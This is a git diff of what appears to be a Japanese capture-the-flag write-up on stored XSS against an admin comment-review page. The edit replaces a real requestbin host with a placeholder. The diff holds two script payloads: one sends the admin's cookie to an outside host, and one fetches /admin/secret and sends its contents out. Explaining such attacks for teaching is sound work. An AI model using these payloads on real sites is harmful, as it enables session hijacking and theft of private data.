@@ -22,7 +22,7 @@ approveのためにAdminがコメントを閲覧するはずなので、Adminの
 送信先として、requestbin ( https://requestbin.com/ )というサービスを使います。
 
 ```
-<script>fetch('http://enx1fi0rxfzxn.x.pipedream.net/?'+document.cookie).then(response => {})</script>
+<script>fetch('http://<server_url>/?'+document.cookie).then(response => {})</script>
 ```
 とコメントすると、requestbinの方にCookieが表示されます。
 
@@ -42,6 +42,6 @@ Cookieが必要なページをadmin側で読み込ませ、その結果を送信
 ```
 <script>
 fetch('/admin/secret').then(e=>e.text()).then(e=>encodeURI(e))
-.then(response => {fetch('http://enx1fi0rxfzxn.x.pipedream.net/?q='+response)})
+.then(response => {fetch('https://<server_url>/?q='+response)})
 </script>
 ```
